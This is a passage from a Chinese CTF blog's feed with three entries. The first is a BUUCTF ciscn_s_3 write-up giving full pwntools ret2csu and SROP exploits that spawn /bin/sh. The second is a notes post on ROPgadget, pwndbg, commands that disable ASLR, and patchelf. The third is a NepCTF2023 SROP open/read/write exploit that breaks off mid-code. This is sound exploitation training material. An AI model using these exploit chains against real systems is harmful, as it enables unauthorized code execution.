stack_addr<span class="token number">-0x148</span></code></pre><h2 id="0x03-4"><a href="#0x03-4" class="headerlink" title="0x03"></a>0x03</h2><h3 id="第一种做法：ret2csu控制执行execve"><a href="#第一种做法：ret2csu控制执行execve" class="headerlink" title="第一种做法：ret2csu控制执行execve"></a>第一种做法：ret2csu控制执行execve</h3><p>__libc_csu_init       （具体可以看<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/">ctf-wiki</a>中的介绍）</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308082004182.png" alt="image-20230808200450127"></p><p>需要将各寄存器置为： rax  0x3B  rdi = ‘/bin/sh’ rsi = 0 rdx = 0</p><p>ROPgadget 能找到控制rdi和rsi的，以及syscall  （不过实际上没有用rsi的，因为csu中有pop r14和mov rsi, r14指令，可以通过栈上布置将rsi置为0）</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308082024016.png" alt="image-20230808202429992"></p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308082008232.png" alt="image-20230808200850211"></p><p>现在还要想办法控制rdx</p><p>通过__libc_csu_init可以看到，我们可以先执行pop r13然后再执行mov rdx, r13将rdx置为0</p><p>同时还要注意： </p><ol><li>0x400589: call [r12 + rbx * 8], 会执行r12+rbx<em>8地址指向的函数，不过这里没有需要执行的函数，所以可以在buf里放了个ret;的地址…, 然后让r12 + rbx</em>8指向buf；call函数之前会自动将下一条指令入栈，接着执行ret则rsp指针相当于不变</li><li>cmp rbx, rbp; jnz short loc_400580, 如果rbx和rbp相同会循环。想要绕过需要使 rbx = 0  rbp = 1 </li><li>泄露函数地址后直接重进的vul函数，buf的地址不变</li></ol><pre class=" language-python"><code class="language-python">pop_rdi <span class="token operator">=</span> <span class="token number">0x4005a3</span>syscall <span class="token operator">=</span> <span class="token number">0x400501</span>vul_addr <span class="token operator">=</span> <span class="token number">0x4004ed</span>ret_addr <span class="token operator">=</span> <span class="token number">0x4003a9</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'/bin/sh\0'</span><span class="token comment" spellcheck="true">#为之后函数跳转和传入binsh做准备</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4004e2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># rax=0x3b</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x40059a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 6个pop</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># rbx = 0, rbp = 1</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>buf_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token comment" spellcheck="true"># r12 = buf_addr，r13 r14 r15 = 0</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400580</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true">#执行寄存器r12指向的函数  （也就是ret）；把rdx设为0            </span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">7</span> <span class="token comment" spellcheck="true"># 这里执行到0x400596后又会重新pop一遍, 开头执行add rsp, 8让rsp跳过了栈上的一个数据，如何执行6pop，所以栈上布置7个0</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf_addr <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># rdi = &amp;'/bin/sh\0'</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>vul_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="第二种：SROP"><a href="#第二种：SROP" class="headerlink" title="第二种：SROP"></a>第二种：SROP</h3><p>具体可参考<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">ctf-wiki</a></p><p>本题解法可参考<a href="https://www.cnblogs.com/wudiiv11/p/buuctf-ciscn_2019_s_3.html#:~:text=%E8%A7%A3%E6%B3%952%20sigret-,%E5%8E%9F%E7%90%86,-linux%E5%A4%84%E7%90%86signal">这篇博客</a></p><pre class=" language-python"><code class="language-python">sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> constants<span class="token punctuation">.</span>SYS_execvesigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> buf_addrsigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x0</span>sigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x0</span>sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscallpayload <span class="token operator">=</span> b<span class="token string">'/bin/sh\0'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> b<span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4004da</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span> <span class="token operator">+</span> bytes<span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span></code></pre><p>利用pwntools的sigframe模块即可</p><p>其实这两种解法都是以程序读入足够多的字节为条件的</p><p>完整exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span> p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ciscn_s_3'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p = remote('node4.buuoj.cn',29591)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x4005a3</span>syscall <span class="token operator">=</span> <span class="token number">0x400501</span>vul_addr <span class="token operator">=</span> <span class="token number">0x4004ed</span>ret_addr <span class="token operator">=</span> <span class="token number">0x4003a9</span>vul_addr <span class="token operator">=</span> <span class="token number">0x4004ed</span>payload <span class="token operator">=</span> b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vul_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#buf_addr = stack_addr-0x118</span>buf_addr <span class="token operator">=</span> stack_addr<span class="token number">-0x148</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'/bin/sh\00'</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4004e2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># rax=0x3b</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x40059a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># rdx = 0</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># rbx = 0, rbp = 1</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>buf_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token comment" spellcheck="true"># r12 = buf_addr</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400580</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">7</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf_addr <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># rdi = &amp;'/bin/sh\0'</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#payload += p64(vul_addr)</span><span class="token triple-quoted-string string">'''sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = buf_addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rip = syscallpayload = b'/bin/sh\0'.ljust(0x10, b'a') + p64(0x4004da) + p64(syscall) + bytes(sigframe)'''</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="wp" scheme="http://lmarch2.github.io/categories/wp/"/>
    
    
    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
    
    <category term="BUUCTF" scheme="http://lmarch2.github.io/tags/BUUCTF/"/>
    
  </entry>
  
  <entry>
    <title>PWN一些用到的指令和工具</title>
    <link href="http://lmarch2.github.io/posts/6121198a/"/>
    <id>http://lmarch2.github.io/posts/6121198a/</id>
    <published>2023-08-28T13:54:45.000Z</published>
    <updated>2024-02-04T06:54:35.848Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h1><!-- toc --><ul><li><a href="#ropgadget---binary-------only-----------grep-------------">ROPgadget –binary 文件名 –only “指令|指令” | grep 寄存器或者其他存在的字段</a></li><li><a href="#ropgadget---binary-------sting---bin-sh-">ROPgadget –binary 文件名 –sting ‘/bin/sh’</a></li></ul><ul><li><a href="#vmmap">vmmap</a></li><li><a href="#vim">vim</a></li><li><a href="#pwndbg">pwndbg</a></li><li><a href="#aslr-pie--">ASLR和pie编译</a></li><li><a href="#shellcode">shellcode</a></li><li><a href="#gcc----">GCC编译指令</a></li><li><a href="#-----">关于符号表</a></li><li><a href="#patchelf">patchelf</a></li></ul><!-- tocstop --><span id="more"></span><h2 id="ROPgadget-–binary-文件名-–only-“指令-指令”-grep-寄存器或者其他存在的字段"><a href="#ROPgadget-–binary-文件名-–only-“指令-指令”-grep-寄存器或者其他存在的字段" class="headerlink" title="ROPgadget –binary 文件名 –only “指令|指令” | grep 寄存器或者其他存在的字段"></a>ROPgadget –binary 文件名 –only “指令|指令” | grep 寄存器或者其他存在的字段</h2><p>查找汇编指令的地址</p><p>例子：</p><blockquote><p>ROPgadget –binary get_started_3dsctf_2016 –only “mov|ret” |grep eax</p><p>ROPgadget –binary get_started_3dsctf_2016 –only “mov|ret” |grep ‘: mov eax’ </p></blockquote><ul><li><p>–only ” | “ 表示只返回含有xx指令或xx指令的gadget</p></li><li><p>grep  表示含有什么什么特定字段（通常是寄存器）的指令</p><p>但是grep能寻找的必须是连续的指令中间不能隔开，连空格都必须一致才能被搜索到</p><p>比如你想要搜索<code>0x080701a8 : mov eax, ecx ; ret</code>，你可以用命令<code>ROPgadget --binary get_started_3dsctf_2016 --only "mov|ret" |grep 'eax, ecx'</code>；命令<code>ROPgadget --binary get_started_3dsctf_2016 --only "mov|ret" |grep 'eax,ecx'</code>无法成功因为逗号和ecx之间少了一个空格</p></li><li><p>取地址的指令[edx]无法被识别，[ ]在ROPgadget中貌似是表示含有[ ]内字母的指令</p><p>比如 ROPgadget –binary get_started_3dsctf_2016 –only “mov|ret” |grep ‘[edx]’得到的是这样</p><p><img src="https://pica.zhimg.com/80/v2-a03e74edb3f031ec31244d7ace622128_720w.png"></p></li></ul><h2 id="ROPgadget-–binary-文件名-–sting-‘-x2F-bin-x2F-sh’"><a href="#ROPgadget-–binary-文件名-–sting-‘-x2F-bin-x2F-sh’" class="headerlink" title="ROPgadget –binary 文件名 –sting ‘/bin/sh’"></a>ROPgadget –binary 文件名 –sting ‘/bin/sh’</h2><p>查找字符串地址</p><p>例子：</p><blockquote><p> ROPgadget –binary 文件名 –sting ‘/bin/sh’</p><p> ROPgadget –binary 文件名 –sting ‘/sh’</p><p> ROPgadget –binary 文件名 –sting ‘sh’</p><p> ROPgadget –binary 文件名 –sting ‘cat flag’</p><p> ROPgadget –binary 文件名 –sting ‘cat flag.txt’</p></blockquote><p>![(</p><p><img src="https://pic1.zhimg.com/80/v2-85292d5975829cdb33d0680fe463d9b0_720w.webp"></p><h1 id="vmmap"><a href="#vmmap" class="headerlink" title="vmmap"></a>vmmap</h1><pre><code>vmmap [-h] [pages_filter]</code></pre><p>首先vmmap需要在pwndbg，且程序运行时使用</p><ul><li>输入vmmap，显示出程序运行时所用到的所有地址段</li><li>输入vmmap  地址  ，显示该地址对应的地址段</li><li>vmmap  -h，提示帮助；-w只显示可写的部分；-x只显示可执行的部分</li></ul><p>例子：</p><p><img src="https://pic1.zhimg.com/80/v2-81b1d3537046d8b961f5b5f4e3ae9265_720w.png"></p><p><img src="https://picx.zhimg.com/80/v2-d34d469968326f73e2dc20875beb8092_720w.png"></p><p><img src="https://pic1.zhimg.com/80/v2-1e067d5c59a6e8aa80e6bc37f171f76e_720w.png?source=d16d100b"></p><p>第一行，表明了哪个颜色对应哪个段，</p><p>start和end对应该地址段的起始和结束位置</p><p>Perm 是该段的权限，rwx代表可读、可写、可执行</p><p>Size表示该段大小</p><p>Offset表示这段与程序基址的偏移</p><p>File表示加载的是什么</p><h1 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h1><p>命令模式下：</p><blockquote><p>$行末</p><p>^行首</p><p>L屏幕底行</p><p>H屏幕顶行</p><p>yy拷贝该行</p><p>dd删除该行</p><p>P前粘贴</p><p>p后粘贴</p><p>D 删除至行尾</p><p>u撤销</p><p>gg光标移至行首</p><p>dG删除光标行及光标行以下全部内容</p></blockquote><p>底线命令模式下：</p><blockquote><p>:wq保存并退出</p><p>:%d删除全部内容</p><p>:%s替换       <a href="http://10.102.32.142:8000/d/55-shi-bei-xi-ri-ben-ren-zai-ci-fen-xiang-you-qu-you-yong-de-xin-shou-xue-xi-zi-yuan/13#:~:text=%E5%89%8D%E5%B7%B2%E7%BC%96%E8%BE%91-,vim%E7%9A%84%E6%89%B9%E9%87%8F%E6%9B%BF%E6%8D%A2,-%E5%9C%A8%20Vim%20%E4%B8%AD">参考</a>（万里哥我滴神）</p></blockquote><h1 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h1><p>基本指令</p><ul><li>r = run 运行程序，如果你当前已经在运行程序了，再输入r会重新运行程序</li><li>b = break 下断点，在调试pwn中，一般是 b <em>0xabcde ，abcde是在ida中看到的地址,如b</em> 0x400908</li><li>c = continue 继续运行程序直到停在下一个断点</li><li>n = next 下一行，一般装了pwndbg之后下一行指的是下一条汇编，但是如果调试的程序是带调试信息的，一般会跳几行汇编</li><li>ni = nexti 下一条指令，这个就是真正的下一条汇编指令</li><li>s = step 单步进入函数</li><li>d = delete 删除断点，后面可带数字，说明删除第几个断点，如果不带参数，说明删除全部断点</li><li>x 查看内存</li></ul><p>c,n,ni这几个程序都可以带一个数字，用来代表连续运行这个指令多少次</p><blockquote><p> x/num xg  地址  64位查看某处地址</p></blockquote><blockquote><p>x/num xw  地址  32位查看某处地址</p></blockquote><blockquote><p>s/num s  地址  查看从地址开始的num个字符串</p></blockquote><blockquote><p>b *$rebase(地址)           用于开启PIE该指令会在基址+地址处下断点 </p></blockquote><p><a href="https://wizardforcel.gitbooks.io/100-gdb-tips/content/index.html">https://wizardforcel.gitbooks.io/100-gdb-tips/content/index.html</a><br>100个gdb小技巧</p><p>gdb制定程序运行的参数<br>gdb –args binary value</p><p>gdb调试改变地址或地址指向值<br>set addr_old = addr<br>set *addr_old = addr</p><p>bt<br>显示函数所有调用栈的信息<br>bt n<br>显示栈顶的n个调用信息<br>bt -n<br>显示栈底的n个调用信息</p><p>中间加full表示   显示栈中所有帧的完全信息如：函数参数，本地变量</p><h1 id="ASLR和pie编译"><a href="#ASLR和pie编译" class="headerlink" title="ASLR和pie编译"></a>ASLR和pie编译</h1><p>查看系统当前ASLR打开情况</p><blockquote><p>sudo cat /proc/sys/kernel/randomize_va_space</p></blockquote><p>ASLR的三个级别 ：</p><p>0， 不开启任何随机化；</p><p>1， 开启stack、libraries [、executable base（special libraries -^-） if PIE is enabled while compiling] 的随机化；</p><p>2，开启heap随机化。</p><p>PIE编译出来的executable如果ASLR=0的话，基址也是不会变的（有能力但没使用），如果ASLR=1的话，即使按照ASLR定义这个级别似乎不会对heap基址随机化，但是由于executable的基址已经随机化了，所以heap的基址自然也就被随机化了</p><blockquote><p>指令关闭ASLR</p><p>sysctl -w kernel.randomize_va_space=0</p><p>echo 0 &gt; /proc/sys/kernel/randomize_va_space</p></blockquote><p>  <img src="https://picx.zhimg.com/80/v2-a997d1be275e1071f3a7d542c0874870_720w.png"></p><p>fPIE选项仅能在编译可执行码时用，不能用于编译库。所以，如果想要PIE的程序，需要你除了在gcc增加-fPIE选项外，还需要在ld时增加-pie选项才能产生这种代码。即gcc -fpie -pie来编译程序。单独使用哪一个都无法达到效果。 </p><blockquote><p>gcc  helloworld.c </p><p>file a.out a.out: </p><p>ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped </p><p>file a.out a.out: </p><p>ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped </p></blockquote><p>未开启PIE的文件属性为executable，开启的为shared object</p><p>注意PIE随机程序加载基地址，要和libc的随机libc库基地址区分</p><h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>pwntools生成的shellcode默认64位</p><blockquote><p>shellcode = asm(shellcraft.sh()) </p></blockquote><p>要生成32位的shellcode需要指定</p><blockquote><p>shellcode = asm(shellcraft.sh(),arch=’i386’,os=’linux’)      </p></blockquote><p>手动反汇编汇编指令</p><blockquote><p>xx = asm(‘’’</p><p>‘’’)</p></blockquote><h1 id="GCC编译指令"><a href="#GCC编译指令" class="headerlink" title="GCC编译指令"></a>GCC编译指令</h1><p>gcc各保护编译指令<br><a href="https://blog.csdn.net/tabactivity/article/details/126660974">https://blog.csdn.net/tabactivity/article/details/126660974</a><br><a href="https://zoepla.github.io/2018/04/gcc%E7%9A%84%E7%BC%96%E8%AF%91%E5%85%B3%E4%BA%8E%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E5%BC%80%E5%90%AF%E7%9A%84%E9%80%89%E9%A1%B9/">https://zoepla.github.io/2018/04/gcc%E7%9A%84%E7%BC%96%E8%AF%91%E5%85%B3%E4%BA%8E%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E5%BC%80%E5%90%AF%E7%9A%84%E9%80%89%E9%A1%B9/</a><br>全开</p><blockquote><p>gcc test.c -o test -z noexecstack -z now -fstack-protector -fpie -pie</p></blockquote><p>全关</p><blockquote><p> gcc test.c -o test -z execstack -z norelro -fno-stack-protector -no-pie</p></blockquote><p>sudo sh -c “echo 0 &gt; /proc/sys/kernel/randomize_va_space”关闭ASLR<br>把0换成2就是开启</p><p>编译时加上 -m32 即编译成32位程序</p><p><a href="https://blog.csdn.net/Jason_ZhouYetao/article/details/81606358">https://blog.csdn.net/Jason_ZhouYetao/article/details/81606358</a></p><h1 id="关于符号表"><a href="#关于符号表" class="headerlink" title="关于符号表"></a>关于符号表</h1><pre><code>readelf binary -p .comment或  objdump -s --section=.comment binary</code></pre><p>可以查看程序或编译器版本</p><p>readelf，objdump，去符号表，恢复符号表<br>上链接<br><a href="https://blog.csdn.net/edonlii/article/details/8779075">readelf</a><br><a href="https://blog.csdn.net/qq_41683305/article/details/105375214">objdump</a><br><a href="https://xuanxuanblingbling.github.io/ctf/tools/2019/09/06/symbol/">去符号表</a><br><a href="https://loora1n.github.io/2022/11/01/%E3%80%90%E7%A5%A5%E4%BA%91%E6%9D%AF2022%E3%80%91PWN-WriteUp-protocol/">恢复符号表</a></p><h1 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h1><p>patchef四部曲</p><p>ldd  binary<br>列出动态库依赖</p><p>strings 题目给的libc名 | grep ubuntu<br>快速找到Libc文件对应版本</p><p>（cp 想替换的文件到赛题目录）</p><p>patchelf –set-interpreter ./ld-2.27.so ./binary<br>—————————对应的ld文件—-pwn文件</p><p>patchelf –replace-needed libc.so.6 ./libc-2.27.so ./binary<br>————————-原本的libc—-要替换的libc—–pwn文件       </p><p>（若只用上述命令碰到如下报错时）<br><img src="https://github.com/lmarch2/images/blob/main/typora/202308012217243.png?raw=true"><br>patchelf –replace-needed libpthread.so.0 ./libpthread-2.31.so ./binary<br> ——————————–原本的     ———   要替换的</p><p>Linux命令    </p><p>pwd ：获取当前所在目录路径<br>realpath file : 获取文件地址</p><p>pip list查看已安装包<br>pip show 包名 查看包安装路径</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ROPgadget&quot;&gt;&lt;a href=&quot;#ROPgadget&quot; class=&quot;headerlink&quot; title=&quot;ROPgadget&quot;&gt;&lt;/a&gt;ROPgadget&lt;/h1&gt;&lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#ropgadget---binary-------only-----------grep-------------&quot;&gt;ROPgadget –binary 文件名 –only “指令|指令” | grep 寄存器或者其他存在的字段&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ropgadget---binary-------sting---bin-sh-&quot;&gt;ROPgadget –binary 文件名 –sting ‘/bin/sh’&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#vmmap&quot;&gt;vmmap&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#vim&quot;&gt;vim&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#pwndbg&quot;&gt;pwndbg&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#aslr-pie--&quot;&gt;ASLR和pie编译&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#shellcode&quot;&gt;shellcode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#gcc----&quot;&gt;GCC编译指令&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#-----&quot;&gt;关于符号表&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#patchelf&quot;&gt;patchelf&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;</summary>
    
    
    
    <category term="tools and tricks" scheme="http://lmarch2.github.io/categories/tools-and-tricks/"/>
    
    
    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
    
    <category term="pwn" scheme="http://lmarch2.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2023NepCTF WP</title>
    <link href="http://lmarch2.github.io/posts/0/"/>
    <id>http://lmarch2.github.io/posts/0/</id>
    <published>2023-08-15T03:25:59.095Z</published>
    <updated>2024-02-04T06:52:04.983Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="NepCTF2023-WP"><a href="#NepCTF2023-WP" class="headerlink" title="NepCTF2023 WP"></a>NepCTF2023 WP</h1><p>真的超级紧张刺激的比赛！！有做不出题目夜不能寐的痛苦，也有冥思苦想之后的豁然开朗，第一次感受到了ctf比赛的乐趣所在。虽然最后的成绩停留在110，不过对于一个初出茅庐的萌新，已经很满足了；即使比赛结束后才做出三月七和最后放出的两个pwn题（挺气的，早知道不看万恶的login的……）。那就给自己继续加油吧，希望下次比赛能拿到属于自己的一份荣誉！</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h2><p>使用经典srop技巧，但是在此基础上又加了orz，观察程序会发现，能够调用sigreturn（调用号为0xf），而且溢出量足够大（0x300）。整体的一个思路就是构造system call chains，伪造四个栈帧，在syscall返回的时候，rsp会返回到另一个sigframe，从而实现一个又一个的函数调用。</p><p>几个注意点：</p><ol><li>利用pwntools写frame的时候对各个寄存器传入的都是地址，不能直接把字符串写进去（会bytes()报错    <del>别问为什么我知道</del>）</li><li>返回执行系统syscall的时候注意这个程序只有call _system，而没有直接的syscall汇编指令，而进入到call _system单步调试可以发现这个过程中各个寄存器的值是会发生变化的（不同的寄存器之间赋值），所以我们在构造frame指定寄存器值的时候需要根据call _system中的指令来调整frame的各个寄存器值，sigreturn也是如此，有其他的命令会改变rax的值，因此需要多一个pop rdi控制一下</li><li>各个stack_frame需要精心构造</li><li>因为沙箱禁掉了execve，所以我们使用open,read,write绕过沙箱。（一定注意这里读取文件内容的read系统调用rdi传参是3）</li></ol><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#p = process("./pwn")</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'nepctf.1cepeak.cn'</span><span class="token punctuation">,</span><span class="token number">31552</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span><span class="token comment" spellcheck="true">#syscall = 0x400788</span>syscall <span class="token operator">=</span> <span class="token number">0x04005B0</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000400813</span>sigreturn <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xf</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x400750</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>buf <span class="token operator">=</span> <span class="token number">0x0601020</span>  <span class="token comment" spellcheck="true"># buf地址</span><span class="token comment" spellcheck="true">#write</span>frame4 <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span>kernel<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>frame4<span class="token punctuation">.</span>rdi <span class="token operator">=</span> constants<span class="token punctuation">.</span>SYS_write<span class="token comment" spellcheck="true">#rax</span>frame4<span class="token punctuation">.</span>rcx <span class="token operator">=</span> <span class="token number">0x40</span><span class="token comment" spellcheck="true">#rdx</span>frame4<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">1</span><span class="token comment" spellcheck="true">#rdi</span>frame4<span class="token 